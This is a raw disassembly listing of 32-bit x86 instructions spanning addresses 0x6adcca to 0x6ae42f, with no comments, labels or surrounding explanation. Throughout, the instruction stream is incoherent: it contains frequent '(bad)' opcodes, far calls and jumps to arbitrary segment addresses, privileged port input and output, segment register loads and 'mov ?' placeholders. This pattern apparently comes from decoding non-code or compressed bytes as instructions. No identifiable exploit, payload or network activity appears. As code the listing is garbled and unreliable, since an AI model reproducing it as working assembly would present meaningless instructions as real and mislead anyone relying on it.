  6adcca:	mov    WORD PTR [esi+eax*1],fs
  6adccd:	xor    al,0x23
  6adccf:	arpl   si,bp
  6adcd1:	shl    ah,cl
  6adcd3:	stos   DWORD PTR es:[edi],eax
  6adcd4:	stos   BYTE PTR es:[edi],al
  6adcd5:	shl    BYTE PTR [edi],cl
  6adcd7:	inc    edi
  6adcd8:	mov    dl,BYTE PTR [edi+0x79]
  6adcdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6adcdc:	add    eax,0xdce790bc
  6adce1:	fld    QWORD PTR [eax]
  6adce3:	adc    esi,DWORD PTR [ebp-0x6b23e2f6]
  6adce9:	jg     0x6add02
  6adceb:	pop    ebp
  6adcec:	mov    cs,esi
  6adcee:	add    BYTE PTR [eax],0xa1
  6adcf1:	jl     0x6add4a
  6adcf3:	xor    dl,cl
  6adcf5:	adc    bl,bl
  6adcf7:	jmp    0x4d37:0x4e8c6ae6
  6adcfe:	les    ecx,FWORD PTR [ebp-0x75d8911d]
  6add04:	sbb    al,0xe1
  6add06:	cmp    bh,BYTE PTR [eax]
  6add08:	popa   
  6add09:	jg     0x6add40
  6add0b:	mov    DWORD PTR [ebx+0x3],edx
  6add0e:	stos   BYTE PTR es:[edi],al
  6add0f:	and    eax,esi
  6add11:	call   0xdd3e:0x4aac44a
  6add18:	xchg   edi,eax
  6add19:	mov    dh,0x11
  6add1b:	mov    ds:0x7c93f468,al
  6add20:	in     al,dx
  6add21:	dec    ebp
  6add22:	cmp    edx,DWORD PTR [edx+0x28]
  6add25:	imul   ecx,DWORD PTR [ebx+edi*1-0x23d56843],0xac56467e
  6add30:	add    al,0x39
  6add32:	cmp    ah,bl
  6add34:	ja     0x6add7a
  6add36:	or     dh,BYTE PTR [ebx+0xe]
  6add39:	loop   0x6add3c
  6add3b:	shl    eax,0xa2
  6add3e:	popf   
  6add3f:	dec    ebx
  6add40:	into   
  6add41:	neg    DWORD PTR [edx+0x39]
  6add44:	je     0x6add11
  6add46:	cwde   
  6add47:	mov    ds,esp
  6add49:	stos   DWORD PTR es:[edi],eax
  6add4a:	inc    esi
  6add4b:	mov    eax,ds:0x80e0c12e
  6add50:	jo     0x6add1d
  6add52:	add    ebp,DWORD PTR [ebp+0xd]
  6add55:	xor    DWORD PTR [eax-0x380436d7],ebp
  6add5b:	mov    edi,0x60b07bcb
  6add60:	or     eax,0x45ea5e92
  6add65:	push   esp
  6add66:	or     eax,0x4302b05f
  6add6c:	fiadd  DWORD PTR [ecx-0x27903aa2]
  6add72:	push   ss
  6add73:	popa   
  6add74:	push   edi
  6add75:	sbb    bl,BYTE PTR [edx]
  6add77:	test   al,0xfb
  6add79:	push   esp
  6add7a:	sub    al,0x64
  6add7c:	cmp    eax,0xdb90320d
  6add81:	push   edx
  6add82:	mov    al,ds:0xefa900
  6add87:	sahf   
  6add88:	ja     0x6addcb
  6add8a:	adc    ebp,DWORD PTR [ebp-0x20]
  6add8d:	pop    ebp
  6add8e:	mov    al,0x81
  6add91:	imul   eax,DWORD PTR [eax+esi*2-0x37],0xa0fdf46f
  6add99:	mov    eax,ds:0xad06968
  6add9e:	xchg   ebp,eax
  6add9f:	add    ecx,esi
  6adda1:	inc    esp
  6adda2:	adc    DWORD PTR [edx+0x3a],eax
  6adda5:	mov    al,0xec
  6adda7:	add    eax,0xced9fd
  6addac:	call   0x5807:0x8e5b00de
  6addb3:	add    DWORD PTR [ecx-0x3f],0xffffffc6
  6addb7:	cs movd mm5,esp
  6addbb:	jge    0x6addb9
  6addbd:	mov    bl,0xa1
  6addbf:	scas   eax,DWORD PTR es:[edi]
  6addc0:	enter  0x5fc9,0x90
  6addc4:	imul   edi,edx,0xd5407746
  6addca:	sub    DWORD PTR [edx+0x7a],ebp
  6addcd:	push   esi
  6addce:	(bad)  
  6addd0:	fcom   QWORD PTR [esp+ecx*4+0x65]
  6addd4:	in     al,0x6
  6addd6:	aas    
  6addd7:	jo     0x6ade05
  6addd9:	or     eax,0x1e68ee09
  6addde:	sahf   
  6adddf:	dec    ecx
  6adde0:	call   0x52bec399
  6adde5:	repz (bad) 
  6adde7:	bnd jnp 0x6ade14
  6addea:	adc    al,0x33
  6addec:	out    0xca,eax
  6addee:	jg     0x6ade01
  6addf0:	fisttp WORD PTR [eax+ebp*1]
  6addf3:	pushf  
  6addf4:	fxch   st(2)
  6addf6:	inc    esp
  6addf7:	dec    eax
  6addf8:	nop
  6addf9:	push   ebp
  6addfa:	sub    dh,BYTE PTR [ebp+eiz*1-0x40]
  6addfe:	add    ebx,DWORD PTR [edi-0x6f9b458e]
  6ade04:	retf   0xeb58
  6ade07:	sbb    ebp,eax
  6ade09:	out    dx,al
  6ade0a:	mov    esp,0x318dc498
  6ade0f:	xchg   edi,eax
  6ade10:	sbb    eax,0xe895c8b9
  6ade15:	pop    eax
  6ade16:	mov    ebx,0x2efeb422
  6ade1b:	xor    DWORD PTR [edi-0x19],0xc27968e2
  6ade22:	cmp    BYTE PTR [ebp+0x6d62690b],ah
  6ade28:	ins    BYTE PTR es:[edi],dx
  6ade29:	jbe    0x6ade14
  6ade2b:	sub    BYTE PTR [eax],ah
  6ade2d:	xor    ebp,ecx
  6ade2f:	and    edi,DWORD PTR [edi-0x2e84af8d]
  6ade35:	scas   al,BYTE PTR es:[edi]
  6ade36:	add    edx,edi
  6ade38:	xchg   ch,dl
  6ade3a:	mov    ch,BYTE PTR [edi+0x212075ac]
  6ade40:	clc    
  6ade41:	jns    0x6addfc
  6ade43:	cmp    eax,0x6778a715
  6ade48:	jbe    0x6ade87
  6ade4a:	out    0x6e,al
  6ade4c:	inc    edx
  6ade4d:	pusha  
  6ade4e:	mov    ecx,0x2e472875
  6ade53:	mov    edi,0x53f6ca77
  6ade58:	inc    ebx
  6ade59:	out    0x3e,al
  6ade5b:	mov    BYTE PTR [edi-0x18781f79],al
  6ade61:	test   eax,0x418fd3d2
  6ade66:	adc    DWORD PTR [ebx],eax
  6ade68:	cmp    edx,DWORD PTR [ebx+0x4b464c4d]
  6ade6e:	mov    dl,0xf5
  6ade70:	lods   al,BYTE PTR ds:[esi]
  6ade71:	adc    DWORD PTR [eax-0x33],0xc19fe5ae
  6ade78:	sub    esi,edx
  6ade7a:	es jl  0x6ade0c
  6ade7d:	(bad)  
  6ade7e:	es jmp 0x9a7e:0x7bd4f06
  6ade86:	adc    esi,ebx
  6ade88:	push   edx
  6ade89:	dec    esi
  6ade8a:	jb     0x6ade25
  6ade8c:	fdiv   st(7),st
  6ade8e:	adc    al,0xfa
  6ade90:	push   esp
  6ade91:	jecxz  0x6ade30
  6ade93:	mov    cl,0xa4
  6ade95:	pop    ebp
  6ade96:	(bad)  
  6ade97:	xlat   BYTE PTR ds:[ebx]
  6ade98:	add    esp,esi
  6ade9a:	test   BYTE PTR [eax+0x56f641d2],0xd3
  6adea1:	and    bl,dh
  6adea3:	ins    DWORD PTR es:[edi],dx
  6adea4:	jp     0x6adec6
  6adea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6adea7:	adc    BYTE PTR ds:0x8ad59671,ah
  6adead:	mov    ch,0x48
  6adeaf:	add    eax,0x8b821c2
  6adeb4:	sbb    al,0xe5
  6adeb6:	pop    esi
  6adeb7:	test   DWORD PTR [eax+ecx*8-0x31],ebx
  6adebb:	and    BYTE PTR [eax],dl
  6adebd:	or     eax,0x142b3b33
  6adec2:	ficomp WORD PTR [edi]
  6adec4:	or     DWORD PTR [edi+0x3f75ad74],eax
  6adeca:	inc    edx
  6adecb:	mov    ecx,0x40bcde01
  6aded0:	mov    bh,BYTE PTR [ebx-0x3d]
  6aded3:	xor    BYTE PTR [esi+0x6f],bl
  6aded6:	mov    ch,dh
  6aded8:	stos   DWORD PTR es:[edi],eax
  6aded9:	push   ds
  6adeda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6adedb:	or     eax,0x861ee7dc
  6adee0:	dec    esp
  6adee1:	xchg   edx,eax
  6adee2:	bound  ebx,QWORD PTR [eax-0x6db12cb]
  6adee8:	xor    eax,0x6efd22d0
  6adeed:	js     0x6adf0b
  6adeef:	mov    ecx,0x8190eaf3
  6adef4:	pop    ss
  6adef5:	or     BYTE PTR [edx-0x7f],ah
  6adef8:	xchg   ebp,eax
  6adef9:	pop    esi
  6adefa:	fcmovnu st,st(0)
  6adefc:	jp     0x6aded1
  6adefe:	aad    0x9b
  6adf00:	arpl   WORD PTR [eax],cx
  6adf02:	jmp    0x6adf0f
  6adf04:	add    al,0xf3
  6adf06:	adc    esi,esp
  6adf08:	div    BYTE PTR [esi]
  6adf0a:	add    al,0xd4
  6adf0c:	cs and al,0xe8
  6adf0f:	les    ecx,FWORD PTR [ecx+0x79]
  6adf12:	pop    ebp
  6adf13:	xlat   BYTE PTR ds:[ebx]
  6adf14:	or     DWORD PTR ds:0xb8bec2dc,0x3ae086f9
  6adf1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6adf1f:	jns    0x6adf3e
  6adf21:	std    
  6adf22:	test   DWORD PTR [esi+0x71f723fc],0xb174c029
  6adf2c:	pop    esp
  6adf2d:	cdq    
  6adf2e:	les    ebp,FWORD PTR [edx+esi*1+0x56484c19]
  6adf35:	int    0x1
  6adf37:	int3   
  6adf38:	sub    bl,bl
  6adf3a:	stos   DWORD PTR es:[edi],eax
  6adf3b:	pop    ds
  6adf3c:	fwait
  6adf3d:	outs   dx,DWORD PTR ds:[esi]
  6adf3e:	add    BYTE PTR [ecx],ah
  6adf40:	and    BYTE PTR ds:0x15bb55e2,al
  6adf46:	mov    dl,0x4
  6adf48:	mov    ch,0xba
  6adf4a:	and    ebx,DWORD PTR [esi]
  6adf4c:	xchg   edx,eax
  6adf4d:	pop    edx
  6adf4e:	test   bh,ah
  6adf50:	push   ds
  6adf51:	fsub   st,st(7)
  6adf53:	dec    edi
  6adf54:	fldenv [esi+ecx*8-0x713c18e6]
  6adf5b:	cmp    BYTE PTR [ebx+eiz*2],dl
  6adf5e:	mov    dh,0x63
  6adf60:	enter  0xa9fb,0x16
  6adf64:	inc    ebp
  6adf65:	jmp    0x207898ab
  6adf6a:	or     edx,DWORD PTR [ebp+0x7a]
  6adf6d:	inc    eax
  6adf6e:	add    BYTE PTR [eax+edi*2-0x13],bh
  6adf72:	mov    esi,0x80d69698
  6adf77:	jl     0x6adf0d
  6adf79:	lods   eax,DWORD PTR ds:[esi]
  6adf7a:	push   edx
  6adf7b:	sar    BYTE PTR ss:[esi+0x1c301a34],0x75
  6adf83:	dec    ecx
  6adf84:	scas   eax,DWORD PTR es:[edi]
  6adf85:	sar    BYTE PTR [edx+esi*2-0x6dd9c5c8],0x4d
  6adf8d:	fistp  QWORD PTR [ebx]
  6adf8f:	mov    bh,BYTE PTR ds:0x2fead133
  6adf95:	push   es
  6adf96:	xchg   ebx,eax
  6adf97:	pop    ds
  6adf98:	mov    edi,0x651cf375
  6adf9d:	adc    bh,BYTE PTR [ebx-0x42]
  6adfa0:	es jnp 0x6adf23
  6adfa3:	mov    ecx,0xdea7573d
  6adfa8:	and    al,0xf3
  6adfaa:	push   es
  6adfab:	scas   eax,DWORD PTR es:[edi]
  6adfac:	leave  
  6adfad:	jl     0x6adf5d
  6adfaf:	push   esi
  6adfb0:	(bad)  
  6adfb2:	pop    edx
  6adfb3:	push   0xffffffef
  6adfb5:	stc    
  6adfb6:	test   DWORD PTR [ecx+0x29],edi
  6adfb9:	hlt    
  6adfba:	mov    cl,BYTE PTR [ebx]
  6adfbc:	rcl    DWORD PTR [ebp-0x24b11b48],1
  6adfc2:	ficom  DWORD PTR [edi+0x78]
  6adfc5:	mov    WORD PTR [ebx-0x42382488],es
  6adfcb:	pop    esi
  6adfcc:	mov    esi,0xeeb1d054
  6adfd1:	addr16 pushaw 
  6adfd4:	rcr    ebp,0xc3
  6adfd7:	into   
  6adfd8:	shr    DWORD PTR [eax-0x17bedaa4],1
  6adfde:	stc    
  6adfdf:	cmp    al,0xb1
  6adfe1:	inc    edx
  6adfe2:	dec    ebp
  6adfe3:	stc    
  6adfe4:	pop    edx
  6adfe5:	dec    esp
  6adfe6:	lock cmp al,0xf0
  6adfe9:	sbb    eax,0x4b0ee6c1
  6adfee:	test   BYTE PTR [esi],ch
  6adff0:	mov    esp,0x83cf3f18
  6adff5:	adc    ecx,DWORD PTR [edi-0x65de2324]
  6adffb:	sar    ah,1
  6adffd:	pop    ds
  6adffe:	(bad)  
  6adfff:	fidiv  WORD PTR [edx-0x249cefaf]
  6ae005:	ins    BYTE PTR es:[edi],dx
  6ae006:	outs   dx,BYTE PTR ds:[esi]
  6ae007:	test   DWORD PTR [ebx+0xc5021c0],eax
  6ae00d:	retf   0xdf4c
  6ae010:	repz push es
  6ae012:	jmp    0x6adff0
  6ae014:	ss add eax,0x41359660
  6ae01a:	stc    
  6ae01b:	mov    bl,0x85
  6ae01d:	pop    ss
  6ae01e:	jo     0x6adfa2
  6ae020:	loop   0x6ae09f
  6ae022:	lea    edi,[edi+eiz*2-0x5066fca6]
  6ae029:	inc    esi
  6ae02a:	jle    0x6ae08a
  6ae02c:	cmp    eax,0xf1e5a111
  6ae031:	pop    es
  6ae032:	mov    cl,0x16
  6ae034:	cwde   
  6ae035:	hlt    
  6ae036:	sahf   
  6ae037:	push   0xffffff85
  6ae039:	ror    DWORD PTR [eax+ebp*8],cl
  6ae03c:	call   0xb6db:0xf6b687d8
  6ae043:	cwde   
  6ae044:	gs inc eax
  6ae046:	add    DWORD PTR ds:0x6ca311df,esi
  6ae04c:	pop    eax
  6ae04d:	aam    0x3d
  6ae04f:	mov    ch,0xc5
  6ae051:	(bad)  
  6ae052:	in     al,0xc2
  6ae054:	sbb    BYTE PTR [esi-0x7f],cl
  6ae057:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ae058:	enter  0x81e,0xed
  6ae05c:	and    DWORD PTR [esi],eax
  6ae05e:	pusha  
  6ae05f:	pop    ss
  6ae060:	(bad)  
  6ae062:	sub    eax,0x13e40e7c
  6ae067:	push   esp
  6ae068:	(bad)  
  6ae069:	mov    WORD PTR ss:[ecx-0x526dd4f6],ds
  6ae070:	js     0x6ae09a
  6ae072:	aas    
  6ae073:	das    
  6ae074:	into   
  6ae075:	sar    BYTE PTR [eax+0x16],cl
  6ae078:	jecxz  0x6ae00f
  6ae07a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ae07b:	mov    edx,0xc7c4bd27
  6ae080:	lea    eax,[esi-0x1f7fa74b]
  6ae086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6ae087:	pop    es
  6ae088:	aaa    
  6ae089:	or     DWORD PTR [eax],ebp
  6ae08b:	pop    es
  6ae08c:	cmp    al,0x40
  6ae08e:	das    
  6ae08f:	pop    esi
  6ae090:	call   0xaab2:0x1b1388fc
  6ae097:	add    al,0xfd
  6ae099:	jb     0x6ae030
  6ae09b:	fdiv   QWORD PTR [ecx+0x73]
  6ae09e:	and    al,0xb0
  6ae0a0:	dec    edi
  6ae0a1:	adc    eax,0xb9888c3f
  6ae0a6:	xchg   BYTE PTR [esp+edi*1-0x27684e35],cl
  6ae0ad:	cdq    
  6ae0ae:	push   0x7d
  6ae0b0:	add    eax,esp
  6ae0b2:	neg    DWORD PTR [ecx]
  6ae0b4:	sbb    edi,esi
  6ae0b6:	jecxz  0x6ae03e
  6ae0b8:	mov    bl,0xb4
  6ae0ba:	fdivr  QWORD PTR [esp+ebx*2-0x69f999bc]
  6ae0c1:	xchg   ebp,eax
  6ae0c2:	test   eax,0xbdcad457
  6ae0c7:	fucom  st(5)
  6ae0c9:	jecxz  0x6ae04e
  6ae0cb:	jns    0x6ae080
  6ae0cd:	cmp    bh,BYTE PTR [ecx]
  6ae0cf:	aas    
  6ae0d0:	push   esp
  6ae0d1:	mov    edx,0x79a4500e
  6ae0d6:	fs sub edx,ebx
  6ae0d9:	int    0x26
  6ae0db:	pop    edx
  6ae0dc:	inc    eax
  6ae0dd:	push   cs
  6ae0de:	push   edx
  6ae0df:	mov    esp,0xaa0f9bee
  6ae0e4:	mov    WORD PTR [esi],ds
  6ae0e6:	gs test ecx,0x8f001d47
  6ae0ed:	pop    eax
  6ae0ee:	bnd jnp 0x6ae0b5
  6ae0f1:	(bad)  
  6ae0f2:	add    ebx,DWORD PTR [eax]
  6ae0f4:	psrlq  mm4,QWORD PTR [ecx+edi*2+0x6346b704]
  6ae0fc:	hlt    
  6ae0fd:	pop    ds
  6ae0fe:	ret    0x1c16
  6ae101:	loope  0x6ae11d
  6ae103:	xor    edx,DWORD PTR [edi-0x451bea6]
  6ae109:	in     eax,0xf0
  6ae10b:	adc    DWORD PTR ds:0xb91dff8c,esi
  6ae111:	pop    ecx
  6ae112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6ae113:	arpl   WORD PTR [eax],bp
  6ae115:	std    
  6ae116:	out    dx,eax
  6ae117:	out    0x19,al
  6ae119:	rcr    ecx,0xcc
  6ae11c:	xchg   ebx,eax
  6ae11d:	and    DWORD PTR [eax],edi
  6ae11f:	test   DWORD PTR [edi],esi
  6ae121:	outs   dx,BYTE PTR ds:[esi]
  6ae122:	xchg   edi,eax
  6ae123:	and    BYTE PTR [ecx-0x1c531ca],0x2f
  6ae12a:	jnp    0x6ae102
  6ae12c:	add    eax,0x94582fac
  6ae131:	out    0x3,eax
  6ae133:	lea    edi,[edx]
  6ae135:	pop    ecx
  6ae136:	sbb    DWORD PTR [eax-0x64],ecx
  6ae139:	call   0x411a948
  6ae13e:	xor    eax,0xddd1cc11
  6ae143:	mov    ?,WORD PTR [ebp-0x33]
  6ae146:	fld1   
  6ae148:	mov    BYTE PTR [ebx+0x22],ah
  6ae14b:	mov    ds:0x425f4fea,eax
  6ae150:	or     DWORD PTR [edx+0x19fa4a08],esp
  6ae156:	sub    eax,0xd9f240e1
  6ae15b:	js     0x917c2302
  6ae161:	inc    edi
  6ae162:	mov    ebp,eax
  6ae164:	or     esp,DWORD PTR [edi+0x4f]
  6ae167:	imul   ecx,DWORD PTR [edx],0x5f
  6ae16a:	mov    al,0xf8
  6ae16c:	hlt    
  6ae16d:	cmp    BYTE PTR [ecx],0xd7
  6ae170:	mov    esi,0x82a21d3a
  6ae175:	shr    BYTE PTR [ecx],0x5a
  6ae178:	mov    WORD PTR [esi+ecx*8-0x5c74ba3d],?
  6ae17f:	and    ch,dl
  6ae181:	xchg   ebx,eax
  6ae182:	mov    al,ds:0x7036499b
  6ae187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ae188:	es aaa 
  6ae18a:	inc    esi
  6ae18b:	in     eax,dx
  6ae18c:	je     0x6ae18b
  6ae18e:	mov    ebp,0x54e1164e
  6ae193:	adc    eax,edx
  6ae195:	adc    dh,BYTE PTR ds:0x140bc562
  6ae19b:	mov    ebp,0x11a7de96
  6ae1a0:	xor    dh,BYTE PTR [ecx-0x6c]
  6ae1a3:	sbb    eax,0x700fcb8f
  6ae1a8:	(bad)
  6ae1ab:	sbb    dl,cl
  6ae1ad:	daa    
  6ae1ae:	(bad)  
  6ae1af:	into   
  6ae1b0:	leave  
  6ae1b1:	mov    ds,esi
  6ae1b3:	test   DWORD PTR [ecx+0x48],eax
  6ae1b6:	jge    0x6ae1ae
  6ae1b8:	and    BYTE PTR [eax-0x79],dl
  6ae1bb:	mov    esi,0x6234defc
  6ae1c0:	add    ah,BYTE PTR [ebx+esi*4-0x7a]
  6ae1c4:	adc    ebp,DWORD PTR [edi-0x5cb9845a]
  6ae1ca:	(bad)
  6ae1cd:	push   esi
  6ae1ce:	std    
  6ae1cf:	mul    BYTE PTR [eax-0x3e]
  6ae1d2:	and    BYTE PTR [ecx],0x86
  6ae1d5:	jecxz  0x6ae1c7
  6ae1d7:	jo     0x6ae1ba
  6ae1d9:	sbb    eax,DWORD PTR ds:0xfdaa9b7d
  6ae1df:	fwait
  6ae1e0:	imul   edi,DWORD PTR [edi-0x75],0xee1fd9df
  6ae1e7:	sub    al,0x5f
  6ae1e9:	sahf   
  6ae1ea:	test   BYTE PTR [edx-0x1384394f],cl
  6ae1f0:	push   0xffffff9f
  6ae1f2:	xchg   ebp,eax
  6ae1f3:	call   0x208b192e
  6ae1f8:	daa    
  6ae1f9:	fdivr  st(1),st
  6ae1fb:	bnd ja 0x6ae1db
  6ae1fe:	(bad)  
  6ae1ff:	mov    dh,0x93
  6ae201:	mov    esp,0x8d1c0658
  6ae206:	test   BYTE PTR [esi],ah
  6ae208:	mov    al,ds:0x771b9a35
  6ae20d:	cmp    esi,edi
  6ae20f:	cli    
  6ae210:	jno    0x6ae250
  6ae212:	call   0xe1487f06
  6ae217:	retf   
  6ae218:	mov    dl,0x27
  6ae21a:	dec    ebp
  6ae21b:	dec    ecx
  6ae21c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6ae21d:	jno    0x6ae288
  6ae21f:	push   edx
  6ae220:	mov    dl,0xdb
  6ae222:	cmc    
  6ae223:	sti    
  6ae224:	pop    ecx
  6ae225:	xchg   ebx,eax
  6ae226:	fist   WORD PTR [eax+0x16]
  6ae229:	xchg   ebp,edi
  6ae22b:	sub    al,0x91
  6ae22d:	adc    ecx,DWORD PTR [ebx+0x13a3ac2d]
  6ae233:	sub    DWORD PTR [ecx],ebp
  6ae235:	ficomp WORD PTR [ecx+0x72899aa7]
  6ae23b:	int    0x30
  6ae23d:	cmp    BYTE PTR [ecx+0x6f],ch
  6ae240:	push   es
  6ae241:	loope  0x6ae275
  6ae243:	adc    eax,DWORD PTR [edx-0x527818d0]
  6ae249:	out    dx,eax
  6ae24a:	out    0xc7,eax
  6ae24c:	gs jne 0x6ae288
  6ae24f:	dec    edi
  6ae250:	out    0x45,al
  6ae252:	stos   DWORD PTR es:[edi],eax
  6ae253:	test   ah,dh
  6ae255:	jg     0x6ae1d9
  6ae257:	imul   edx,DWORD PTR [edi-0x5e],0x24
  6ae25b:	or     BYTE PTR [edi+0x5fac3900],0x8c
  6ae262:	popf   
  6ae263:	cld    
  6ae264:	outs   dx,BYTE PTR ds:[esi]
  6ae265:	cmp    al,0xfb
  6ae267:	adc    al,0x34
  6ae269:	scas   eax,DWORD PTR es:[edi]
  6ae26a:	adc    dh,BYTE PTR [ebp+edi*1-0x44008b65]
  6ae271:	rol    BYTE PTR [ebx],1
  6ae273:	aad    0x51
  6ae275:	adc    DWORD PTR [eax],0x5ade2746
  6ae27b:	aad    0x32
  6ae27d:	mov    ah,0x2f
  6ae27f:	sar    BYTE PTR [esi+0x44],0x6a
  6ae283:	jecxz  0x6ae2c6
  6ae285:	data16 ins BYTE PTR es:[edi],dx
  6ae287:	jae    0x6ae2b7
  6ae289:	inc    edx
  6ae28a:	fsubr  DWORD PTR [eax-0x7c]
  6ae28d:	add    eax,0x7f2289fb
  6ae292:	scas   eax,DWORD PTR es:[edi]
  6ae293:	loope  0x6ae24a
  6ae295:	inc    DWORD PTR [edx-0x3600ee3c]
  6ae29b:	adc    eax,0x16f42f25
  6ae2a0:	jnp    0x6ae2d5
  6ae2a2:	and    DWORD PTR [esi+esi*4],ecx
  6ae2a5:	or     ebx,ebx
  6ae2a7:	inc    ebx
  6ae2a8:	jp     0x6ae22f
  6ae2aa:	imul   eax,edx,0xffffffd5
  6ae2ad:	inc    esi
  6ae2ae:	and    ah,bl
  6ae2b0:	ins    DWORD PTR es:[edi],dx
  6ae2b1:	pop    es
  6ae2b2:	mov    edi,DWORD PTR [ebx]
  6ae2b4:	fs pop edi
  6ae2b6:	test   eax,0xb1bc4e3d
  6ae2bb:	xchg   eax,eax
  6ae2bd:	fld    DWORD PTR [ecx-0x21]
  6ae2c0:	xchg   esp,eax
  6ae2c1:	jmp    0xa813b89d
  6ae2c6:	dec    edx
  6ae2c7:	(bad)  
  6ae2c8:	push   cs
  6ae2c9:	jnp    0x6ae2be
  6ae2cb:	and    ebx,DWORD PTR [esi]
  6ae2cd:	rcl    BYTE PTR [ebx+0x7c3e105d],1
  6ae2d3:	sti    
  6ae2d4:	add    bl,BYTE PTR [edi+edx*4]
  6ae2d7:	inc    esi
  6ae2d8:	rcl    edi,cl
  6ae2da:	icebp  
  6ae2db:	jmp    0x832318c7
  6ae2e0:	pushf  
  6ae2e1:	mov    cs,ecx
  6ae2e3:	adc    dh,BYTE PTR ds:0x6050614c
  6ae2e9:	shl    BYTE PTR [esi+0x72f8646],cl
  6ae2ef:	push   ebx
  6ae2f0:	shl    BYTE PTR [esi+0x1d],cl
  6ae2f3:	cdq    
  6ae2f4:	inc    eax
  6ae2f5:	jl     0x6ae345
  6ae2f7:	lea    ecx,[esi]
  6ae2f9:	adc    al,0xf
  6ae2fb:	fcmovb st,st(3)
  6ae2fd:	outs   dx,BYTE PTR ds:[esi]
  6ae2fe:	push   eax
  6ae2ff:	sub    esi,esp
  6ae301:	pop    ecx
  6ae302:	cdq    
  6ae303:	dec    DWORD PTR [esi]
  6ae305:	in     al,dx
  6ae306:	in     eax,dx
  6ae307:	mov    edx,0x57a5ee7b
  6ae30c:	aaa    
  6ae30d:	pop    ebp
  6ae30e:	push   esi
  6ae30f:	mov    ds:0xe860d395,al
  6ae314:	ret    
  6ae315:	mov    ds:0x27383701,al
  6ae31a:	dec    edx
  6ae31b:	xchg   edi,eax
  6ae31c:	lods   eax,DWORD PTR ds:[esi]
  6ae31d:	hlt    
  6ae31e:	xchg   esp,eax
  6ae31f:	jnp    0x6ae328
  6ae321:	mov    al,0x58
  6ae323:	out    0xe5,eax
  6ae325:	aam    0x9d
  6ae327:	adc    bl,BYTE PTR [edx]
  6ae329:	in     eax,dx
  6ae32a:	and    al,0xa3
  6ae32c:	pop    eax
  6ae32d:	sbb    ch,cl
  6ae32f:	lods   eax,DWORD PTR fs:[esi]
  6ae331:	push   ecx
  6ae332:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6ae333:	dec    edx
  6ae334:	ret    
  6ae335:	xor    eax,0x56012d36
  6ae33a:	inc    eax
  6ae33b:	dec    eax
  6ae33c:	int    0x4a
  6ae33e:	cwde   
  6ae33f:	imul   DWORD PTR [eax-0x6f4645ef]
  6ae345:	add    ch,ah
  6ae347:	popf   
  6ae348:	push   edi
  6ae349:	xchg   esp,eax
  6ae34a:	enter  0xaa27,0xf4
  6ae34e:	ds and eax,0x840b9c65
  6ae354:	jno    0x6ae37f
  6ae356:	mov    ch,0x1e
  6ae358:	jno    0x6ae3d3
  6ae35a:	js     0x6ae357
  6ae35c:	retf   0xf36
  6ae35f:	jne    0x6ae320
  6ae361:	(bad)  
  6ae362:	mov    ch,0x32
  6ae364:	cmp    eax,0x74e3856a
  6ae369:	pop    ds
  6ae36a:	push   esi
  6ae36b:	ja     0x6ae3a0
  6ae36d:	and    ecx,DWORD PTR [edx-0x2e]
  6ae370:	and    edx,esp
  6ae372:	call   0xa539:0x5d5b82aa
  6ae379:	mov    ?,WORD PTR [ebp-0x15dfbec8]
  6ae37f:	aam    0x62
  6ae381:	add    DWORD PTR [ebp+ecx*2-0x1b88b9ad],eax
  6ae388:	push   edi
  6ae389:	push   ebp
  6ae38a:	ret    
  6ae38b:	repnz and DWORD PTR [edi],ebx
  6ae38e:	mov    edi,0x3ddc682f
  6ae393:	outs   dx,BYTE PTR ds:[esi]
  6ae394:	push   ecx
  6ae395:	pcmpgtd mm5,mm5
  6ae398:	xor    ebp,DWORD PTR [edx]
  6ae39a:	pop    ebp
  6ae39b:	mov    ebx,DWORD PTR [esp+eiz*4]
  6ae39e:	pop    eax
  6ae39f:	xchg   esp,eax
  6ae3a0:	jbe    0x6ae36e
  6ae3a2:	push   0x4082ea05
  6ae3a7:	(bad)  
  6ae3a9:	fwait
  6ae3aa:	jmp    0x5b43:0x46950608
  6ae3b1:	jg     0x6ae374
  6ae3b3:	loope  0x6ae33b
  6ae3b5:	push   ecx
  6ae3b6:	loop   0x6ae342
  6ae3b8:	and    eax,0xc569da46
  6ae3bd:	repnz aaa 
  6ae3bf:	hlt    
  6ae3c0:	cli    
  6ae3c1:	dec    edx
  6ae3c2:	nop
  6ae3c3:	or     al,BYTE PTR [esi+0xb]
  6ae3c6:	jmp    FWORD PTR [esi+0xb]
  6ae3c9:	add    al,cl
  6ae3cb:	xor    ebp,edx
  6ae3cd:	push   edi
  6ae3ce:	aaa    
  6ae3cf:	adc    eax,0xbd271c9b
  6ae3d4:	(bad)  
  6ae3d5:	jecxz  0x6ae418
  6ae3d7:	inc    ecx
  6ae3d8:	js     0x6ae369
  6ae3da:	xor    ah,ch
  6ae3dc:	add    eax,0x7b744542
  6ae3e1:	aas    
  6ae3e2:	or     BYTE PTR [edx+0x27aa887a],dl
  6ae3e8:	int3   
  6ae3e9:	mov    al,ds:0xaa086abc
  6ae3ee:	adc    al,0xb6
  6ae3f0:	or     eax,0x6a41a935
  6ae3f5:	adc    al,0x1c
  6ae3f7:	dec    edx
  6ae3f8:	push   ebx
  6ae3f9:	or     DWORD PTR [eax+0x26],edi
  6ae3fc:	mov    al,ds:0x2e7c9df2
  6ae401:	jne    0x6ae3cc
  6ae403:	push   ebx
  6ae404:	push   0xffffffc7
  6ae406:	sub    BYTE PTR [ebp-0x69f35411],dl
  6ae40c:	or     al,0x9a
  6ae40e:	das    
  6ae40f:	addr16 pop ss
  6ae411:	mov    al,0xe
  6ae413:	sbb    eax,0x2c32623
  6ae418:	and    eax,0x34853c79
  6ae41d:	mov    dl,0x24
  6ae41f:	frstor [ebp-0x13]
  6ae422:	pop    edx
  6ae423:	fcomp  QWORD PTR [eax+esi*2+0xb]
  6ae427:	aad    0x91
  6ae429:	mov    ecx,0x5ebc6b46
  6ae42e:	push   ecx
  6ae42f:	xchg   esp,eax
